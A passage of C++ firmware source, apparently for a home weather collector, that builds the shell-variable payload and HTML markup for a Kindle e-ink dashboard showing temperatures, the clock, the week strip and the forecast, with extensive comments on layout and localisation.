        kdShellVar(s, key, (i == KZ_BIG && bigDefaultInk && !rd.flow.wall)
                           ? "GRAY4" : kdInkFbink(zones.z[i].ink));

        // HOW WIDE THE PIECES COME OUT, in thousandths of the type size they
        // are drawn at. The shell renderer needs them because a unit is set as
        // a footnote at four tenths of its number and a tendency arrow after
        // that, and FBInk draws one size per call — so each piece is a separate
        // draw at an x that depends on the width of the one before it, and
        // FBInk will not say what that width was.
        // The value's figures at KDF_FIG_SIZE — see kdFigAdvance(): at the
        // estimate's 0.5 the unit was drawn onto the last figure.
        s->printf("Z_%s_VADVW=%u\n", up, kdFigAdvance(res[i].text));
        s->printf("Z_%s_UADVW=%u\n", up, kdAdvanceMille(res[i].unit));
        // The caption as the panel prints it, upper case, for a grid row of
        // one, which is centred.
        {
            char lup[64];
            kdUpperUtf8(lup, sizeof(lup), res[i].label);
            // On the wall page the grid's unit is on this line, after it.
            const char* cu = kdZoneIsGrid((uint8_t)i) ? rd.capUnit[i - KZ_G1] : "";
            if (cu[0]) {
                const size_t l = strlen(lup);
                snprintf(lup + l, sizeof(lup) - l, " / %s", cu);
                snprintf(key, sizeof(key), "Z_%s_CAPUNIT", up);
                kdShellVar(s, key, cu);
            }
            s->printf("Z_%s_LADVW=%u\n", up, kdAdvanceMille(lup));
        }

        // The headline needs one more: the whole of it, unit included, because
        // the slash and the second value go after all of it rather than after
        // the number alone.
        if (i == KZ_HERO) {
            char whole[40];
            snprintf(whole, sizeof(whole), "%s%s", res[i].text, res[i].unit);
            kdShellUint(s, "Z_HERO_ADVW", kdFigAdvance(whole));
        }
    }

    // The survivors, in order. An empty list is a group that draws nothing.
    uint8_t used[KZ_GRID_COUNT];
    const int n = (skin.showFlags & KSHOW_GRID)
                ? kdGridUsed(zones, visible, used) : 0;
    kdShellZoneList(s, "GRID_ZONES", used, n);

    // How they break into rows. Worked out here rather than in the script for
    // the reason the packing always was: the HTML page and the reader must not
    // disagree about which cell is on which row, and a balancing rule written
    // twice is a rule written differently.
    int rows[KZ_GRID_COUNT];
    const int nRows = kdGridRowSplit(n, rows, KZ_GRID_COUNT);
    s->print("GRID_ROWS=\"");
    for (int r = 0; r < nRows; r++) {
        if (r) s->print(' ');
        s->print(rows[r]);
    }
    s->print("\"\n");

    uint8_t inUsed[KZ_INDOOR_COUNT];
    const int inN = (skin.showFlags & KSHOW_INSIDE)
                  ? kdIndoorUsed(zones, visible, inUsed) : 0;
    kdShellZoneList(s, "IN_ZONES", inUsed, inN);
}

// ---------------------------------------------------------------------------
// The HTML renderer's half
// ---------------------------------------------------------------------------
/// One value with its unit and, if it has one, its tendency arrow.
static void appendValue(String& p, const KdResolved& r, const KindleSlot& sl,
                        const char* cls, bool withArrow = true) {
    p += F("<span class=\"");
    p += cls;
    if (sl.flags & KSLOTF_BOLD) p += F(" val-b");
    if (sl.flags & KSLOTF_HEAVY) p += F(" val-x");
    // How dark, per place. Black is the default and emits no class, so a page
    // where nobody has touched this carries no extra markup at all.
    if (sl.ink >= KINK_DARK && sl.ink <= KINK_LIGHT) {
        p += F(" ink-");
        p += "dml"[sl.ink - KINK_DARK];
    }
    p += F("\">");
    if (!r.ok) {
        p += F("<span class=\"dim\">&mdash;</span></span>");
        return;
    }
    p += r.text;
    if (r.unit && *r.unit) {
        // TWO UNITS SET TIGHT AGAINST THE NUMBER, and the rest with a space
        // before them. "8.4 °" and "71 %" are not how either is written;
        // "1008 hPa" is. The degree also rides high rather than sitting on the
        // baseline, where at a third of the value's size it reads as a
        // lower-case o.
        const bool deg   = strcmp(r.unit, "°") == 0;
        const bool tight = deg || strcmp(r.unit, "%") == 0;
        p += F("<span class=\"unit");
        if (deg) p += F(" unit-d");
        p += F("\">");
        if (!tight) p += ' ';
        appendEscaped(p, r.unit);
        p += F("</span>");
    }
    if (withArrow && r.arrow && *r.arrow) {
        p += F("<span class=\"tend\">");
        p += r.arrow;
        p += F("</span>");
    }
    p += F("</span>");
}

/// A captioned cell: the label above, the value under it. The grid and the
/// indoor row are the same shape at two sizes, so they are one function.
///
/// `wall`: the wall page's grid, whose unit (`capUnit`) and tendency arrow go
/// on the caption's line — see kdWallUnits().
static void appendCell(String& p, const KdResolved& r, const KindleSlot& sl,
                       const char* valueClass, bool caption = true,
                       const char* capUnit = "", bool wall = false,
                       const char* lineZone = nullptr) {
    const bool capArrow = wall && r.arrow && *r.arrow;
    const bool inv = sl.flags & KSLOTF_INV;
    if (inv) p += F("<div class=\"inv\">");
    if (caption) {
        p += F("<div class=\"lab\">");
        appendEscaped(p, r.ok ? r.label : kdSlotLabel(sl));
        if (capUnit[0] || capArrow) {
            p += F(" <span class=\"lu\">");
            if (capUnit[0]) { p += F("/ "); appendEscaped(p, capUnit); p += ' '; }
            if (capArrow) p += r.arrow;
            p += F("</span>");
        }
        p += F("</div>");
    }
    p += F("<div class=\"cv\">");
    // The place's own 24 h line behind its value (KSLOTF_LINE, wall grid).
    if (lineZone && (sl.flags & KSLOTF_LINE)) {
        p += F("<img class=\"cl\" src=\"/kindle/graph.bmp?line=1&amp;w=200&amp;h=64&amp;z=");
        p += lineZone;
        if (inv) p += F("&amp;inv=1");
        p += F("\" alt=\"\">");
    }
    appendValue(p, r, sl, valueClass, !capArrow);
    p += F("</div>");
    if (inv) p += F("</div>");
}

/// One of the grid's rows: the cells from `at` of the `n` places in `used`,
/// as many as the layout put on row `r`. Returns where the next row starts.
static int appendGridRow(String& p, const KdRender& rd, const uint8_t* used, int n,
                         int at, int r) {
    const KindleZones& zones = kdSlots();
    const int cols = rd.flow.gridRows[r];
    p += F("<table class=\"grid\"><tr>");
    for (int c = 0; c < cols && at < n; c++, at++) {
        // A row of one is centred in the column, as the headline is.
        p += (cols == 1) ? F("<td class=\"c1\" width=\"") : F("<td width=\"");
        p += (int)(100 / cols);
        p += F("%\">");
        appendCell(p, rd.res[used[at]], zones.z[used[at]], "gv", true,
                   rd.capUnit[used[at] - KZ_G1], rd.flow.wall,
                   rd.flow.wall ? kdZoneKey(used[at]) : nullptr);
        p += F("</td>");
    }
    p += F("</tr></table>");
    return at;
}

/// The whole top of the page: the outdoor headline and grid on the left, the
/// clock and the indoor row on the right.
/// The outdoor group: its heading, the headline, the line under it, the grid.
static void appendOutdoor(String& p, const KindleConfig& skin, const KdRender& rd,
                          const bool visible[KZ_COUNT]) {
    const KdResolved* res = rd.res;
    const KdFlow& flow = rd.flow;
    const KindleZones& zones = kdSlots();

    // ── The outdoor headline ────────────────────────────────────────────────
    p += F("<div class=\"lab\">");
    appendEscaped(p, kdGroupOutLabel(zones));
    // The battery badge warns about the node feeding this page, so it belongs
    // on this heading — where it has always been.
    if ((skin.showFlags & KSHOW_BATTERY) && batteryWarningActive())
        appendBatteryBadge(p);
    // NOTHING BESIDE THE HEADLINE, AND IT IS CENTRED: a lone number hard
    // against the left edge left the rest of its column white. The line under
    // it goes with it, so the two still read as one block.
    const bool big = (skin.showFlags & KSHOW_BIG) && zones.z[KZ_BIG].used() &&
                     res[KZ_BIG].ok;
    p += big ? F("</div><div class=\"head\">") : F("</div><div class=\"head ctr\">");

    appendValue(p, res[KZ_HERO], zones.z[KZ_HERO], "v1");
    if (big) {
        p += F("<span class=\"slash\">/</span>");
        appendValue(p, res[KZ_BIG], zones.z[KZ_BIG], "v2");
    }
    p += F("</div>");

    if (rd.sub[0]) {
        p += big ? F("<div class=\"sub\">") : F("<div class=\"sub ctr\">");
        appendEscaped(p, rd.sub);
        p += F("</div>");
    }

    // ── The grid ────────────────────────────────────────────────────────────
    // Broken into rows the way the layout chose — two side by side, or one
    // under the other when that sets them larger — and every cell at the one
    // size it chose. EACH ROW DIVIDES ITS OWN WIDTH BY ITS OWN COUNT: two cells
    // are two halves, not two of three thirds with the last one white.
    if (flow.gridNRows) {
        uint8_t used[KZ_GRID_COUNT];
        const int n = kdGridUsed(zones, visible, used);

        int at = 0;
        for (int r = 0; r < flow.gridNRows; r++) at = appendGridRow(p, rd, used, n, at, r);
    }

}

/// The clock, or the line printed in its place when there is no time to show.
static void appendClock(String& p, const KindleConfig& skin, uint32_t now) {
    // ── The clock ───────────────────────────────────────────────────────────
    // Not a reading and so not a place, but it is what the right column is for.
    // An e-ink panel on a shelf is read across a room, which is why the time is
    // set at 96 px here and not as the 14 px of grey in a corner it started as.
    if (now > 1000000000u) {
        const time_t when_t = (time_t)now;
        struct tm tmv;
        if (localtime_r(&when_t, &tmv) != nullptr) {
            char hm[12];
            kdFmtTime(hm, sizeof(hm), tmv, skin.timeFormat);
            p += F("<div class=\"clock\">"); p += hm; p += F("</div>");
            // The one clock style that needs markup as well as a rule.
            if (skin.clockStyle == KCLOCK_DATED) {
                char dt[32];
                kdFmtDate(dt, sizeof(dt), tmv, skin.dateFormat);
                p += F("<div class=\"clock-d\">"); p += dt; p += F("</div>");
            }
        } else {
            p += F("<div class=\"clock-x\">");
            p += kdT("no time", "няма час");
            p += F("</div>");
        }
    } else {
        // Not "--:--": a plausible-looking blank clock invites the reader to
        // wonder what time it is, where "clock not set" names the fault.
        p += F("<div class=\"clock-x\">");
        p += kdT("clock not set", "часът не е сверен");
        p += F("</div>");
    }

}

/// The indoor row, with its hairline above it when `rule`.
static void appendIndoor(String& p, const KdRender& rd, const bool visible[KZ_COUNT],
                         bool rule) {
    const KdResolved* res = rd.res;
    const KdFlow& flow = rd.flow;
    const KindleZones& zones = kdSlots();

    // ── The indoor row ──────────────────────────────────────────────────────
    // One row with the first field set larger, its share of the width what it
    // needs to be — or, when that sets it larger still, the first field on a
    // line of its own and the others under it. Which one, and every size, is
    // the layout's.
    if (flow.inValSz1) {
        uint8_t used[KZ_INDOOR_COUNT];
        const int n = kdIndoorUsed(zones, visible, used);
        if (n > 0) {
            // The hairline separates the row from what is above it in the
            // same column: the clock upright, the outdoor grid on its side.
            // Upright with no clock there is nothing above it.
            if (rule) p += F("<div class=\"inrule\"></div>");
            p += F("<div class=\"lab\">");
            appendEscaped(p, kdGroupInLabel(zones));
            p += F("</div><table class=\"inrow\"><tr>");
            // THE FIRST FIELD CARRIES NO CAPTION and spends the line on type
            // instead. The heading directly above it already says which room
            // this is, and "TEMP" under it says nothing a degree sign has not
            // already said. The others keep theirs and, on one line, sit on
            // its bottom edge, so the values line up along one edge rather
            // than along their tops.
            //
            // THREE, UPRIGHT, ARE TWO COLUMNS (flow.inCol): the other two one
            // above the other in the second cell, which sits on the same
            // bottom edge, so the lower one lines up with the first.
            const int firstW = flow.inStack ? 100 : (int)((flow.inW1Pm + 5) / 10);
            const bool col = flow.inCol && n == 3 && !flow.inStack;
            for (int i = 0; i < n; i++) {
                if (i == 1 && flow.inStack)
                    p += F("</tr></table><table class=\"inrow inrow2\"><tr>");
                if (col && i == 2) {
                    p += F("<div class=\"inb\">");
                } else {
                    // Alone, it stands in the middle of the column.
                    p += n == 1 ? F("<td class=\"c1\" width=\"") : F("<td width=\"");
                    if (i == 0)            p += firstW;
                    else if (flow.inStack) p += (100 / (n - 1));
                    else if (col)          p += (100 - firstW);
                    else                   p += ((100 - firstW) / (n - 1));
                    p += F("%\">");
                }
                appendCell(p, res[used[i]], zones.z[used[i]],
                           i == 0 ? "iv iv-1" : "iv", i != 0);
                if (col && i == 1) continue;
                if (col && i == 2) p += F("</div>");
                p += F("</td>");
            }
            p += F("</tr></table>");
        }
    }

}

static void appendTopBlock(String& p, const KindleConfig& skin, uint32_t now,
                           const KdRender& rd) {
    bool visible[KZ_COUNT];
    kdZoneVisibility(rd.res, visible);
    const bool clock = rd.flow.clock;
    // Nothing for the right column: the outdoor group has the page's width.
    const bool wide = !clock && !rd.flow.inValSz1;

    // A TABLE, not a grid or flexbox. The reader is a browser from 2014 with no
    // CSS Grid and a flexbox implementation that is not worth finding the edges
    // of; the rest of this page is tables for the same reason.
    p += wide ? F("<table class=\"top\"><tr><td class=\"col-l\" width=\"100%\">")
              : F("<table class=\"top\"><tr><td class=\"col-l\" width=\"50%\">");
    appendOutdoor(p, skin, rd, visible);
    if (!wide) {
        p += F("</td><td class=\"col-r sep\" width=\"50%\">");
        // Not a reading and so not a place, but it is what the right column
        // is for — unless it is switched off, and the indoor row moves up.
        if (clock) appendClock(p, skin, now);
        appendIndoor(p, rd, visible, clock);
    }
    p += F("</td></tr></table>");
}

static void handleKindleData(AsyncWebServerRequest* req) {
    // THE LANGUAGE, FIRST, BEFORE ANYTHING IS WORDED. kdT() and the weekday and
    // month tables read one ambient value rather than taking a parameter each —
    // see DashboardStrings.h for why — and this is where it is set. Every page
    // is rendered start to finish on the async web server's own task, so
    // nothing else is looking at it in between.
    kdLangBegin(config.kindle.lang);

    const Latest outT = latestOf(outdoorSensorId(), "temperature");
    const Latest outH = humidityOf(outdoorSensorId());
    const Latest outP = latestOf(outdoorSensorId(), "pressure");
    const Latest inT  = latestOf(indoorSensorId(),  "temperature");
    const Latest inH  = humidityOf(indoorSensorId());
    const Latest inA  = latestOf(indoorSensorId(),  "aqi");
    const uint32_t now = (uint32_t)time(nullptr);

    TrendRing::Hour tOut[TrendRing::HOURS];
    TrendRing::Hour tIn [TrendRing::HOURS];
    TrendRing::Hour tPress[TrendRing::HOURS];
    const bool haveOut = trendRing.series(outdoorSensorId(), "temperature", now, tOut);
    const bool haveIn  = trendRing.series(indoorSensorId(),  "temperature", now, tIn);
    const bool haveP   = trendRing.series(outdoorSensorId(), "pressure",    now, tPress);
    // Decided here, applied at the chart below: OUT_RANGE is the whole
    // record's, and is read from the hourly buckets before they are swapped.
    const bool chartFine = kdChartWantsFine(tOut, tIn, haveOut, haveIn);

    KindleConfig skin = config.kindle;
    kdSkinClamp(skin);
    char buf[24];

    // The page's shape and everything on it, decided once for this payload:
    // the forecast keys, PAGE_MODE and the layout all have to agree on it.
    const bool standalone = kdStandaloneFor(req);
    const uint8_t rot = kdRotFor(req, skin.rotation);
    const bool wall = kdWallFor(skin.pageStyle, rot, req->hasParam("wall"));
    const bool heroLine = wall && (skin.showFlags & KSHOW_CHART);
    if (wall) kdWallSkin(skin);
    KdRender rd;
    kdRenderBegin(rd, skin, now, standalone, false, kdRotLandscape(rot),
                  req->hasParam("col"), wall);

    AsyncResponseStream* s = req->beginResponseStream("text/plain");
    // The line behind the headline, fetched as /kindle/graph.bmp?line=1.
    kdShellInt(s, "HERO_LINE", heroLine ? 1 : 0);
    // The band behind the headline's 24 h range, when the wall page has one.
    if (wall && skin.subBand)
        s->printf("SUB_BAND=%s\nSUB_INK=%s\n", kdShadeFbink(kdSubBandShade(skin.subBand)),
                  kdShadeFbink(kdSubInkShade(skin.subBand, skin.subInk)));

    // ── Outdoor ──
    fmtTemp(buf, sizeof(buf), outT.value, skin.tempDecimals);
    kdShellVar(s, "OUT_TEMP", outT.ok ? buf : "--");
    kdShellInt(s, "OUT_HUM", outH.ok ? (int)roundf(outH.value) : -1);
    
    if (outP.ok) {
        const float pv = kdPressureValue(outP.value, skin.pressureUnit);
        const int pd = kdPressureDecimals(skin.pressureUnit);
        if (pd) snprintf(buf, sizeof(buf), "%.*f", pd, (double)pv);
        else    fmtInt(buf, sizeof(buf), pv);
        kdShellVar(s, "OUT_PRES", buf);
        kdShellVar(s, "OUT_PRES_UNIT", kdPressureUnitLabel(skin.pressureUnit));
    } else {
        s->print("OUT_PRES=\"--\"\nOUT_PRES_UNIT=\"\"\n");
    }

    if (haveP) {
        const Tendency t = pressureTendency(tPress);
        if (t.have) {
            kdShellVar(s, "OUT_TEND", t.word);
            kdShellVar(s, "OUT_TEND_ARROW", KD_TEND_ARROWS[t.idx]);
            const float dv = kdPressureValue(t.delta, skin.pressureUnit);
            const int ddec = kdPressureDecimals(skin.pressureUnit) + 1;
            s->printf("OUT_TEND_DELTA=\"%+.*f\"\n", ddec, (double)dv);
        } else {
            s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
        }
    } else {
        s->print("OUT_TEND=\"\"\nOUT_TEND_ARROW=\"\"\nOUT_TEND_DELTA=\"\"\n");
    }

    float mn = 1e9f, mx = -1e9f;
    if (haveOut) {
        for (int i = 0; i < TrendRing::HOURS; i++) {
            if (tOut[i].count) {
                if (tOut[i].min < mn) mn = tOut[i].min;
                if (tOut[i].max > mx) mx = tOut[i].max;
            }
        }
    }
    if (mn <= mx) {
        fmtTemp(buf, sizeof(buf), mn, skin.tempDecimals);
        kdShellVar(s, "OUT_RANGE_LO", buf);
        fmtTemp(buf, sizeof(buf), mx, skin.tempDecimals);
        kdShellVar(s, "OUT_RANGE_HI", buf);
    } else {
        s->print("OUT_RANGE_LO=\"\"\nOUT_RANGE_HI=\"\"\n");
    }

    if (outT.ok && outT.ts && now > outT.ts) {
        kdShellUint(s, "OUT_AGE_MIN", (unsigned)((now - outT.ts) / 60));
    } else {
        s->print("OUT_AGE_MIN=0\n");
    }

    bool battWarn = false;
    #ifdef FEATURE_ESPNOW_INGEST
    battWarn = espnowAnyBatteryWarn();
    #endif
    // KSHOW_BATTERY FOLDED IN HERE, not left to the reader. The page tests
    // the flag and the panel did not, so switching the badge off in Settings
    // silenced it on the browser and left it on the Kindle — which is the one
    // of the two that is on the wall being looked at.
    kdShellInt(s, "OUT_BATT_WARN", (battWarn && (skin.showFlags & KSHOW_BATTERY)) ? 1 : 0);

    // ── Indoor ──
    fmtTemp(buf, sizeof(buf), inT.value, skin.tempDecimals);
    kdShellVar(s, "IN_TEMP", inT.ok ? buf : "--");
    kdShellInt(s, "IN_HUM", inH.ok ? (int)roundf(inH.value) : -1);
    if (inA.ok) kdShellInt(s, "IN_AQI", (int)roundf(inA.value));
    else s->print("IN_AQI=\n");
    if (inT.ok && inT.ts && now > inT.ts)
        kdShellUint(s, "IN_AGE_MIN", (unsigned)((now - inT.ts) / 60));
    else
        s->print("IN_AGE_MIN=0\n");

    // ── Clock & Date ──
    if (now > 1000000000u) {
        struct tm tm;
        time_t t = (time_t)now;
        localtime_r(&t, &tm);
        // THE SAME FORMATTERS THE PAGE USES, not a second hardwired pair.
        // These were "%02d:%02d" and "%d %s" while the HTML went through
        // kdFmtTime()/kdFmtDate(), so a reader who chose the twelve-hour clock
        // or an ISO date got it on the browser page and 24-hour, "27 august"
        // on the panel — from one setting, on one device.
        //
        // CLOCK is still not what the panel draws minute to minute: the reader
        // has its own clock and a fetch happens every few minutes at best. It
        // is the sample the reader's own formatting is checked against, and the
        // value the offline page falls back to.
        {
            char tbuf[16];
            kdFmtTime(tbuf, sizeof(tbuf), tm, skin.timeFormat);
            kdShellVar(s, "CLOCK", tbuf);
            // How wide it came out, in thousandths of the type size — the same
            // measurement the places carry, and for the same reason: FBInk
            // draws one size per call and will not say how wide it drew.
            // The boxed and ruled clock styles centre the time, and this is
            // what the reader centres it with.
            kdShellUint(s, "CLOCK_ADVW", kdAdvanceMille(tbuf));

            char dbuf[32];
            kdFmtDate(dbuf, sizeof(dbuf), tm, skin.dateFormat);
            kdShellVar(s, "DATE", dbuf);
        }
        // MONTH_LABEL and YEAR used to be emitted here. Nothing consumed
        // them: update_dash.sh's payload_key_ok() refuses both (so load_kv
        // dropped them on every fetch) and the script never names either one.
        // The panel's date comes from DATE, and the week strip's month from
        // WK_MON_MONTH / WK_SUN_MONTH. Two dead assignments in a payload this
        // device fetches over WiFi every DATA_EVERY minutes.

        int wday = (tm.tm_wday + 6) % 7; // 0=Mon..6=Sun
        time_t monday = t - wday * 86400;
        for (int i = 0; i < 7; i++) {
            time_t day = monday + i * 86400;
            struct tm dtm;
            localtime_r(&day, &dtm);
            // Uppercased (.wd-n is text-transform:uppercase) and measured.
            //
            // MEASURED BECAUSE .wd IS text-align:center. The panel drew both
            // strings at the cell's left edge while the page centred them in
            // it, which on a seven-cell strip is seven visible mistakes in a
            // row. FBInk will not say how wide it drew something, so the width
            // comes from here — the same measurement every place carries.
            char wkn[16];
            kdUpperUtf8(wkn, sizeof(wkn), kdWeekdayShort(i));
            kdShellVarN(s, "WK%d_NAME", i, wkn);
            s->printf("WK%d_NAMEW=%u\n", i, kdAdvanceMille(wkn));

            char wkd[8];
            snprintf(wkd, sizeof(wkd), "%d", dtm.tm_mday);
            s->printf("WK%d_DAY=%s\n", i, wkd);
            s->printf("WK%d_DAYW=%u\n", i, kdAdvanceMille(wkd));
        }
        kdShellInt(s, "WK_TODAY", wday);

        // THE FORECAST IN THE WEEK STRIP, when the reader asked for it and
        // there is a fresh one: tomorrow and the six days after it. The calendar
        // keys above still go out, for a reader too old to know WK_FC. A day
        // the provider did not cover (OpenWeatherMap stops after five) keeps
        // its name and nothing under it.
        #ifdef MODULE_FORECAST_ENABLED
        const ForecastModule::Data wfc = forecastModule.snapshot();
        const int wst = kdWeekFcStart(skin, wfc, now);
        if (wst >= 0) {
            static const ForecastModule::Period none;
            // WF_NOW: the cell to frame as today, none now the strip starts
            // tomorrow. A script too old to read it frames the first cell.
            s->print("WK_FC=1\nWF_NOW=-1\n");
            for (int i = 0; i < ForecastModule::WEEK_N; i++) {
                const int di = wst + 1 + i;        // tomorrow onwards
                const ForecastModule::Period& d =
                    di < ForecastModule::DAYS_N ? wfc.days[di] : none;
                char wn[24];
                kdUpperUtf8(wn, sizeof(wn), d.valid ? forecastPeriodLabel(d)
                                                    : kdWeekdayAhead(tm.tm_wday, i + 1));
                kdShellVarN(s, "WF%d_NAME", i, wn);
                s->printf("WF%d_NAMEW=%u\n", i, kdAdvanceMille(wn));
                // Saturday or Sunday, drawn darker as the calendar's are.
                const int wd = d.valid && d.wday >= 0 ? d.wday : (tm.tm_wday + i + 1) % 7;
                s->printf("WF%d_WE=%d\n", i, (wd == 0 || wd == 6) ? 1 : 0);
                if (d.valid) {
                    char hi[12], lo[12];
                    snprintf(hi, sizeof(hi), "%d°", (int)lroundf(d.tempC));
                    if (isfinite(d.lowC)) snprintf(lo, sizeof(lo), "/%d°", (int)lroundf(d.lowC));
                    else lo[0] = '\0';
                    s->printf("WF%d_ICON=%d\n", i, weatherIconCode(d.code));
                    kdShellVarN(s, "WF%d_HI", i, hi);
                    kdShellVarN(s, "WF%d_LO", i, lo);
                    s->printf("WF%d_HIW=%u\nWF%d_LOW=%u\n",
                              i, kdAdvanceMille(hi), i, kdAdvanceMille(lo));
                } else {
                    s->printf("WF%d_ICON=\nWF%d_HI=\nWF%d_LO=\nWF%d_HIW=0\nWF%d_LOW=0\n",
                              i, i, i, i, i);
                }
            }
        } else
        #endif
        {
            s->print("WK_FC=0\n");
        }

        // The month heading the web page draws above the week strip:
        // one name when the week stays inside a month, two with a dash
        // between them when it straddles the boundary.
        {
            time_t sunday = monday + 6 * 86400;
            struct tm mv, sv;
            if (localtime_r(&monday, &mv) != nullptr &&
                localtime_r(&sunday, &sv) != nullptr) {
                kdShellVarUpper(s, "WK_MON_MONTH", kdMonth(mv.tm_mon));
                kdShellVarUpper(s, "WK_SUN_MONTH",
                                sv.tm_mon != mv.tm_mon ? kdMonth(sv.tm_mon) : "");
            } else {
                s->print("WK_MON_MONTH=\"\"\nWK_SUN_MONTH=\"\"\n");
            }
        }
    } else {
        s->print("CLOCK=\"--:--\"\nCLOCK_ADVW=0\nDATE=\"\"\n");
        for (int i = 0; i < 7; i++)
        {
            char wkn[16];
            kdUpperUtf8(wkn, sizeof(wkn), kdWeekdayShort(i));
            kdShellVarN(s, "WK%d_NAME", i, wkn);
            s->printf("WK%d_NAMEW=%u\nWK%d_DAY=\nWK%d_DAYW=0\n",
                      i, kdAdvanceMille(wkn), i, i);
        }
        s->print("WK_TODAY=-1\nWK_MON_MONTH=\"\"\nWK_SUN_MONTH=\"\"\nWK_FC=0\n");
    }

    // ── Forecast ──
    // STANDALONE SENDS THE EMPTY SET, exactly as a build without the module
    // does. The mode means "this page has no forecast band", so a reader on an
    // older update_dash.sh — which knows nothing about PAGE_MODE — still draws
    // no forecast rather than a stale one under a layout that has no room for
    // it. One rule, two vintages of reader.
    #ifdef MODULE_FORECAST_ENABLED
    if (!standalone) {
        const auto& fc = forecastModule.snapshot();
        kdShellVar(s, "FC_SUMMARY", forecastSummary(fc));
        // Its width, for the wall page, which sets it as large as its column
        // allows — see draw_forecast_body().
        kdShellUint(s, "FC_SUMMARY_ADVW", kdAdvanceMille(forecastSummary(fc)));
        kdShellInt(s, "FC_CODE", fc.code);
        // FC_ICON, NOT FC_CODE, IS WHAT THE PANEL DRAWS WITH. It has eleven BMP
        // files, one per range, and no way to reduce a code itself — so it looked
        // for fc_2_52.bmp on a partly-cloudy afternoon, did not find it, and drew
        // the circled question mark that means "no forecast at all". FC_CODE stays
        // for anything that wants the raw number.
        kdShellInt(s, "FC_ICON", weatherIconCode(fc.code));
        kdShellInt(s, "FC_HIGH", (int)roundf(fc.highC));
        kdShellInt(s, "FC_LOW", (int)roundf(fc.lowC));
        kdShellInt(s, "FC_WIND", (int)roundf(fc.windKph));

        // How old the forecast is, formatted here rather than on the panel: the
        // page draws "· 8 мин" beside the wind and the panel drew nothing, so the
        // one line that says whether to believe the forecast was on one of the two
        // screens. Formatted rather than sent as a number because the wording is
        // the collector's language decision, like every other string it sends.
        {
            char age[16];
            forecastAgeText(age, sizeof(age), fc.fetchedAt, (uint32_t)time(nullptr));
            kdShellVar(s, "FC_AGE", age);
        }
        // Five, whichever way up the page is: the upright page draws the first
        // three and the landscape one all five, and a payload that carried
        // only what this page draws would leave the reader holding the last
        // page's fourth and fifth after it was turned.
        // The hours whenever the week strip holds the days — see
        // appendForecastSection().
        const bool olHourly = kdWeekFcStart(skin, fc, now) >= 0;
        for (int i = 0; i < KD_FC_COLS; i++) {
            const ForecastModule::Period& ol = fc.outlookAt(i, olHourly);
            // forecastPeriodLabel(), NOT .label — the same call the HTML renderer
            // makes. The stored string was written when the provider was last
            // polled, so on this path it was still the language that was set then:
            // switch to Bulgarian and the browser page said ПН/ВТ/СР while the
            // panel on the wall said MON/TUE/WED for up to six hours. Which is the
            // exact defect Period::wday was added to remove.
            char oll[24];
            kdUpperUtf8(oll, sizeof(oll), forecastPeriodLabel(ol));
            kdShellVarN(s, "FC%d_LABEL", i, oll);
            s->printf("FC%d_LABELW=%u\n", i, kdAdvanceMille(oll));
            s->printf("FC%d_CODE=%d\n", i, ol.code);
            s->printf("FC%d_ICON=%d\n", i, weatherIconCode(ol.code));

            // The temperature as it is DRAWN, degree included, because .per is
            // centred and what has to be measured is the whole string.
            char olt[12];
            snprintf(olt, sizeof(olt), "%d°", (int)roundf(ol.tempC));
            s->printf("FC%d_TEMP=%d\n", i, (int)roundf(ol.tempC));
            s->printf("FC%d_TEMPW=%u\n", i, kdAdvanceMille(olt));
            if (!isnan(ol.lowC))
                s->printf("FC%d_LOW=%d\n", i, (int)roundf(ol.lowC));
            else
                s->printf("FC%d_LOW=\n", i);
        }
    } else {
        kdForecastKeysEmpty(s);
    }
    #else
    kdForecastKeysEmpty(s);
    #endif

    // ── UI labels ──
    kdShellVar(s, "LBL_OUTSIDE", KD_T("OUTSIDE", "НАВЪН"));
    kdShellVar(s, "LBL_INSIDE", KD_T("INSIDE", "ВЪТРЕ"));
    kdShellVar(s, "LBL_LAST24", chartFine ? KD_T("LAST 2 HOURS", "ПОСЛЕДНИТЕ 2 ЧАСА")
                                          : KD_T("LAST 24 HOURS", "ПОСЛЕДНИТЕ 24 ЧАСА"));
    kdShellVar(s, "LBL_FORECAST", KD_T("FORECAST", "ПРОГНОЗА"));
    {
        char note[96];
        kdFooterNote(note, sizeof(note));
        kdShellVar(s, "LBL_MEASURED", note);
    }
    kdShellVar(s, "LBL_NO_READING", KD_T("no reading", "няма данни"));
    // Drawn by the reader where the chart would be when the image is not there
    // — a missing fetch, or one that arrived half-written. The reader has its
    // own English fallback, so an older collector still says something.
    kdShellVar(s, "LBL_NO_CHART", KD_T("No chart yet", "Още няма графика"));
    kdShellVar(s, "LBL_WIND", KD_T("wind", "вятър"));
    kdShellVar(s, "LBL_TO", KD_T("to", "до"));

    // What the panel writes when it cannot reach this collector — which is,
    // necessarily, wording it cannot ask for at the moment it needs it. The
    // reader keeps whatever the last successful fetch gave it, so the message
    // is in the reader's language for every outage after the first contact,
    // and in the script's English fallback before that. A panel that has never
    // reached its collector is also a panel nobody has set a language on.
    kdShellVar(s, "LBL_OFFLINE", KD_T("Cannot reach", "Няма връзка с"));
    kdShellVar(s, "LBL_OFFLINE_HINT",
               KD_T("Check WiFi, or KUAL → Settings → Find collector",
                    "Проверете WiFi, или KUAL → Settings → Find collector"));

    // The chart's key, worded here so the panel and the page say the same
    // thing in the same language. The page sets the band clause in grey after
    // the first label; the panel draws it as one line for the same reason it
    // draws everything as one line — there is no inline markup on a
    // framebuffer — so it arrives without the leading comma the HTML needs.
    kdShellVar(s, "LBL_KEY_OUT",  KD_T("outside mean", "средно навън"));
    kdShellVar(s, "LBL_KEY_BAND", KD_T("shaded band = hourly low to high",
                                       "сивото е час. мин–макс"));
    kdShellVar(s, "LBL_KEY_IN",   KD_T("inside", "вътре"));
    // The page sets the first label at #444 and the band clause after it at
    // #777, in one line of markup. On a framebuffer that is two draws at two
    // greys, and the second one starts where the first ended — which FBInk
    // will not say. Measured here, like every other width the reader needs.
    kdShellUint(s, "KEY_OUT_ADVW", kdAdvanceMille(KD_T("outside mean", "средно навън")));

    // ── The eleven places ──
    //
    // The configurable layout, emitted alongside the fixed OUT_*/IN_* keys
    // rather than instead of them. A Kindle running an older copy of
    // update_dash.sh keeps working from the keys it knows; a current one draws
    // the places and ignores them. Nobody has to update the reader and the
    // collector in the same minute.
    emitZones(s, skin, rd);

    // ── Metadata ──
    const uint16_t resW = skin.fbinkResW ? skin.fbinkResW : (uint16_t)KINDLE_PAGE_W;

    // ── Where everything goes ───────────────────────────────────────────────
    // The layout worked out for what is on the page — see KindleFlow.h — as
    // the layout file's own names, at this panel's size. The reader lays them
